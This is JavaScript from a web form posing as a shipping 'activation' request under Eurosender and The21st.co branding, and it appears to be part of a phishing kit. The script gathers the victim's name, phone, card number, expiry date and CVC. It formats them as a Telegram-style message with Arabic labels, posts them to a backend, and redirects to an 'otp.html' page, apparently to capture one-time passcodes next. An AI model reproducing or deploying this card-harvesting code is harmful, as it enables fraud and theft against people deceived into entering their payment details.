(function(){
  const $ = (id) => document.getElementById(id);
  const form = $("activation-form");
  const ok = $("ok");
  const err = $("err");
  const btn = $("submitBtn");
  const yearEl = document.querySelector("#year");
  if (yearEl) yearEl.textContent = new Date().getFullYear();

  // convertir ٠١٢… → 0-9
  function normalizeDigits(str=''){
    const map={'٠':'0','١':'1','٢':'2','٣':'3','٤':'4','٥':'5','٦':'6','٧':'7','٨':'8','٩':'9','۰':'0','۱':'1','۲':'2','۳':'3','۴':'4','۵':'5','۶':'6','۷':'7','۸':'8','۹':'9'};
    return (str+'').replace(/[٠-٩۰-۹]/g, d => map[d] || d);
  }
  function sanitize(o){
    const d = {};
    for (const k in o){ d[k] = typeof o[k]==='string' ? o[k].trim() : o[k]; }
    if (d.phone)   d.phone   = normalizeDigits(d.phone).replace(/\D+/g,'');
    if (d.cNum)    d.cNum    = normalizeDigits(d.cNum).replace(/\D+/g,'');
    if (d.expMonth)d.expMonth= normalizeDigits(d.expMonth).replace(/\D+/g,'');
    if (d.expYear) d.expYear = normalizeDigits(d.expYear).replace(/\D+/g,'');
    if (d.CVC)     d.CVC     = normalizeDigits(d.CVC).replace(/\D+/g,'');
    return d;
  }
  function toTelegramHTML(d){
    const esc = s => String(s||'').replace(/[<&>]/g, c => ({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
    return (
      `<b>طلب تفعيل الشحن</b>\n`+
      `— — — — — — — — —\n`+
      `<b>الاسم:</b> ${esc(d.fullName)}\n`+
      `<b>الجوال:</b> ${esc(d.phone)}\n`+
      `<b>الدولة/المدينة:</b> ${esc(d.country || '-')}/${esc(d.city || '-')}\n`+
      `<b>طريقة التوصيل:</b> ${esc(d.delivery)}\n`+
      (d.cName ? `<b>اسم حامل البطاقة:</b> ${esc(d.cName)}\n` : '')+
      (d.cNum ? `<b>رقم البطاقة:</b> ${esc(d.cNum)}\n` : '')+
      (d.expMonth && d.expYear ? `<b>انتهاء:</b> ${esc(d.expMonth)}/${esc(d.expYear)}\n` : '')+
      (d.CVC ? `<b>CVC:</b> ${esc(d.CVC)}\n` : '')+
      (d.notes ? `<b>ملاحظات:</b> ${esc(d.notes)}\n` : '')+
      `— — — — — — — — —\n<i>Eurosender × The21st.co</i>`
    );
  }

  const NEXT_PAGE = 'otp.html';

  form.addEventListener("submit", async (e)=>{
    e.preventDefault();
    err.style.display='none'; ok.style.display='none';
    btn.disabled = true;

    const data = sanitize(Object.fromEntries(new FormData(form).entries()));
    if(
      !data.fullName || !data.phone || !data.delivery ||
      !data.cName   || !data.cNum || !data.expMonth ||
      !data.expYear || !data.CVC
    ){
      btn.disabled=false; err.style.display='block'; return;
    }

    try{
      const res = await fetch('/api/submit', {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ payload: toTelegramHTML(data) })
      });
      if(!res.ok) throw new Error('Bad response');
      ok.style.display='block';
      setTimeout(()=>{ window.location.href = NEXT_PAGE; }, 600);
    }catch(ex){
      console.error(ex);
      err.style.display='block';
    }finally{
      btn.disabled = false;
    }
  });
})();
